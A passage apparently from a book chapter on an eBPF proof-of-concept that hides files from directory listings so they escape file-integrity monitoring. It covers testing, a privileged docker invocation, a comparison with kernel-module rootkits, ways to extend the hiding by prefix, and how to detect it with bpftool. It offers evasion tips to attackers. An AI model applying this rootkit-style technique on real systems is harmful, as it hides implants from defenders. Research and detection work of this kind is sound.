There's also `bpftool map dump name hidden`, which dumps the contents of the hidden set in cleartext. That's the attacker's own cheat sheet. A defender who runs `bpftool map list` and `bpftool map dump` on every BPF map on the box can read the attacker's target list directly.

The summary: existing FIM tools are blind to this cloak. They trust readdir. That trust was always questionable — LKM rootkits have exploited it for a decade — and it remains questionable. A FIM product that advertises integrity monitoring but doesn't handle readdir manipulation is promising a guarantee it can't deliver.

The honest limits of the cloak remain: it's readdir-only. `open()`, `stat()`, `inotify`, `fanotify`, direct block-device reads all see the file. An attacker relying on the cloak to hide a persistent implant from, say, `inotify`-based monitors would be mistaken. For the specific use case of slipping past FIM scans, the cloak is effective. For anything broader, it's not enough.

And one more factual correction from the original draft: earlier versions of this chapter described hooks at `iterate_dir` and `vfs_stat`. Those aren't the hooks in the POC. `iterate_dir` runs inside the kernel before the buffer is copied to userspace, and kprobing it to filter would require modifying in-kernel `dir_context` structures, which is a harder problem and not one this POC solves. `vfs_stat` is the wrong primitive — we're not hiding from `stat`, we're hiding from `readdir`. The tracepoint-plus-`bpf_probe_write_user` path is what actually works on modern kernels without kernel modification, and that's what ships.

## Testing Notes and Reproducibility

A few things I checked during POC development that didn't make it into the code but are worth documenting for reproducers.

**`ls -f` vs `ls -A`.** `ls -f` tells ls to skip sorting and to skip calling stat on each entry. Internally it does a single large `getdents64` read and prints results as they come. Because it reads in one big buffer, it's the edge case most likely to exceed the 64-entry loop bound. I tested with `ls -f` in a directory of 100 files (including several hidden ones) and confirmed that the last few hidden files in the buffer were not cloaked — they appeared in the output — while the first several were cloaked. This confirms the bound. For directories smaller than ~60 entries, `ls -f` and `ls -A` produce equivalent cloaked output.

The README example in `dBPF-pocs/pocs/ch10-inode-cloak/README.md` even mentions a specific interplay: it says `/bin/ls -f` "bypasses some buffering," which is true in the sense that ls-f hands the raw getdents64 stream to stdout without re-sorting. But "ground truth" using `/bin/ls -f` is only ground truth if the cloak is not attached; once the BPF is active, even `ls -f` sees the post-mutation stream. The commented reference to "raw filesystem" in the README evidence output is aspirational — to actually see the raw on-disk entries you'd need `debugfs -R 'ls'` or an offline mount, which are not what `ls -f` does.

**`find . -name "*"` is equivalent to readdir for our purposes.** find calls `getdents64` internally for each directory it traverses. The cloak applies to every directory the traversal enters.

**`strace -e getdents64`.** strace observes the syscall from outside the calling process, via ptrace. The buffer it shows is the post-BPF-mutation buffer — strace reads the memory after the syscall returns, which is after our tracepoint has fired. So strace output shows the cloaked view. A defender running `strace ls /tmp/cloak` would see the same two files ls shows, not the four that actually exist. Strace is not a reliable detector of this cloak.

**`/sys/fs/bpf/` pins.** The POC does not pin its programs or maps. `bpftool` can still see them because BPF objects are visible to any process with `CAP_BPF` or root, pinned or not. Pinning only matters for persistence across process exit; it doesn't help or hurt detection.

**Repro on different filesystems.** I tested tmpfs, ext4, and overlayfs. All three work the same from the BPF program's perspective because the cloak operates at the syscall boundary, after any filesystem-specific logic has completed. The only filesystem-level variation is the initial order of entries returned by readdir, which affects whether the first-entry fallback triggers. Tmpfs tends to return entries in insertion order. Ext4 returns in hash order. Overlayfs merges from multiple lower layers with some filesystem-specific ordering. None of this affects the cloak's correctness; it only affects which files happen to land first.

**Repro on different user APIs.** In addition to the straight C walker I described earlier, I tested Python's `os.listdir`, Go's `os.ReadDir`, Node.js's `fs.readdirSync`, and Rust's `std::fs::read_dir`. All five got the cloaked view. None detected the mismatch. A curious thing: Python's `os.scandir`, which returns `DirEntry` objects with cached stat-like info, computed `d_type` from the cloaked buffer and reported the filesystem as containing two files. But a subsequent `os.stat(path + '/.backdoor')` succeeded and returned the file's real metadata. Any program that composes scandir with explicit stats is vulnerable to reporting inconsistent views of "the same" directory.

**Repro on aarch64 vs x86_64.** The tracepoint is arch-agnostic. I developed on aarch64 (Apple Silicon, linuxkit in Docker Desktop) and cross-tested on x86_64 (a Debian cloud VM). Both work. The only difference is that `bpftool prog show` lists different JIT sizes because the architectures have different instruction densities, which is cosmetic.

**Repro on containers.** Running the loader inside a privileged container (`docker run --privileged`) works identically to running it on the host. Running it inside an unprivileged container fails at `bpf()` syscall load because the unprivileged namespace doesn't hold `CAP_BPF` on the host. The README suggests the privileged-container invocation:

```
docker run --rm --privileged --pid=host \
  -v "$PWD/../..":/work -w /work \
  -v /sys/kernel/debug:/sys/kernel/debug -v /sys/fs/bpf:/sys/fs/bpf \
  dbpf-base bash -c 'cd pocs/ch10-inode-cloak && \
    ./build/ch10-inode-cloak & sleep 1; bash trigger.sh; sleep 1; kill %1'
```

`--privileged` grants BPF capabilities. `--pid=host` shares the host's PID namespace so the trigger can observe host-wide effects. `-v /sys/kernel/debug` and `-v /sys/fs/bpf` expose the BPF filesystems. Without any of these, the load fails with a permissions error or the attach fails with a missing symbol error. The demo environment matters.

## On the Comparison With LKM Rootkits

A natural question: why bother with the BPF reproduction when LKM rootkits have done this for years and do it more thoroughly (hooking readdir, stat, open, inotify all at once)?

Three reasons the BPF version is interesting:

**No module load.** LKM rootkits require `insmod`/`modprobe` or some equivalent, which is a well-known attack path and is monitored by every EDR that's worth deploying. BPF programs load via the `bpf()` syscall, which is a lower-visibility surface. Auditing `bpf()` requires specific audit rules; auditing module loads is default-on for most security-conscious environments.

**Live-reloadable.** An LKM rootkit runs until rmmod. A BPF cloak can be loaded, adjusted (the hidden set is a BPF map — mutable from userspace at runtime), and unloaded cleanly. Attackers who want to change what they're hiding don't have to reload anything.

**Fewer persistence artifacts.** An LKM leaves traces in `/proc/modules`, `lsmod`, `/sys/module/*`. A BPF program leaves traces in `bpftool prog list` and `/proc/<pid>/fdinfo`, which are less commonly monitored.

The LKM rootkit is more thorough (it can hook more syscalls) but leaves more evidence. The BPF cloak is narrower (readdir-only) but leaves less evidence. For an attacker whose threat model is "evade generic FIM but not a targeted forensic investigation," the BPF cloak is a strictly better primitive.

For an attacker facing a sophisticated forensic team that dumps memory, diffs inode trees against readdir output, and audits BPF program loads, neither approach is safe. The cloak is a time-buyer, not a guarantee.

## Closing Notes

A few things I noticed in assembly that didn't fit cleanly above:

**The ringbuf event is lossy.** The POC emits one event per cloaked entry per syscall. For a busy ls running in a cron loop, the ringbuf can fill faster than the loader drains it. Events are dropped. The cloak itself is unaffected — the write_user has already happened — but the audit trail is incomplete. For a real attacker this is a feature (fewer traces of what was cloaked); for a defender trying to reconstruct activity, it's an annoyance. Increasing the ringbuf size helps, as does draining on a tighter tick.

**The `active` map is keyed by pid_tgid with 10240 entries.** On a box with more than 10240 active threads calling getdents64 simultaneously — unlikely, but possible under extreme conditions — the map fills and new entries evict old. An evicted entry means the enter handler stashed state that the exit handler can't find, so the exit handler bails out and no cloak happens for that syscall. The failure mode is "cloak temporarily disabled for this syscall," not a crash. For normal loads this doesn't matter.

**The hidden-set map is at most 32 entries.** `MAX_HIDDEN` is defined as 32 in both the BPF program and the loader. Adding a 33rd hidden name would fail the map_update. For attackers this might be too few; it's easy to bump the constant if needed. I kept it small because 32 is more than enough for the demo.

**The loader uses `bpf_map__update_elem`, not `bpf_map_update_elem`.** The former is libbpf's typed wrapper around the latter. It checks map type, key size, and value size against the compiled skeleton, which catches bugs earlier. For small programs either works; `bpf_map__update_elem` is the cleaner choice.

**Comm is truncated to 15 chars.** Same as Chapter 9. `bpf_get_current_comm(&e->comm, sizeof(e->comm))` reads the current task's name into the event. A task with a long name appears truncated in the audit log.

**No trigger-runs-loader mode.** Unlike some of the other POCs (ch07, ch14), the trigger in ch10 is a BEFORE/AFTER demonstration that requires the loader to be running during the AFTER phase. If you invoke the harness directly, it runs the loader in the background, invokes the trigger, and captures both outputs. This is standard.

**Why not `BPF_MAP_TYPE_LPM_TRIE` for the hidden set?** An LPM trie would let you hide by filename prefix, which is a useful generalization — "hide everything starting with `.attacker-`". I went with exact-match HASH for simplicity. Adding an LPM trie is a one-struct change to the BPF program and a switch from exact-match lookup to `bpf_map_lookup_elem` against a trie key. Worth doing in a v2 of the POC if anyone wants to productionize the cloak.

**Why hash the name into a `struct hidden_name` with a fixed 64-byte buffer?** The map key has to be a fixed size; HASH maps don't support variable-length keys. Using a 64-byte struct pads every name to 64 bytes whether the name is short or long. A name like `"a"` is stored as `{'a', 0, 0, ..., 0}`. The lookup key in the BPF program is built the same way: `bpf_probe_read_user_str` copies up to NAME_MAX (also 64) bytes and null-terminates. Both sides agree on the encoding, so exact match works. NAME_MAX on Linux is technically 255, not 64 — we can't hide files with names longer than 63 bytes using this map layout. Directory names in practice are usually short, so the limit is academic, but it's worth flagging.

**`dmesg` is your friend.** After running this POC, if you check `dmesg` on the host, you'll see rate-limited warnings about BPF writing to user space memory. These warnings persist in the kernel log until rotation. Note that on 6.12, `bpf_probe_write_user` does not actually set the `TAINT_USER` bit in `/proc/sys/kernel/tainted` — the detection signal is purely in dmesg. For demo purposes, that's fine. For sustained use, it's a detection surface. If you're thinking about using this primitive outside a demo context, budget for the dmesg noise.

That's the chapter. The `d_reclen` swallow is old; the BPF-on-6.12 reproduction is current. The hook choice (syscall tracepoints) is boring but reliable. The verifier pushback (64-iteration loop bound) is annoying but not fatal. The first-entry edge case is real but rare. The FIM blind spot is the load-bearing finding: every FIM I tested trusts readdir, and readdir has always been lie-able-to.

Next chapter pivots away from filesystem cloaking to a very different primitive — IRQ-level side channels — and the contrast is stark. This chapter's primitive is narrow and well-understood; the next is broad and still being mapped. Both rely on the same underlying fact: BPF gives you unprecedented access to kernel internals from a privileged-but-not-module position, and the gap between "observe" and "tamper" in that position is smaller than most threat models assume.
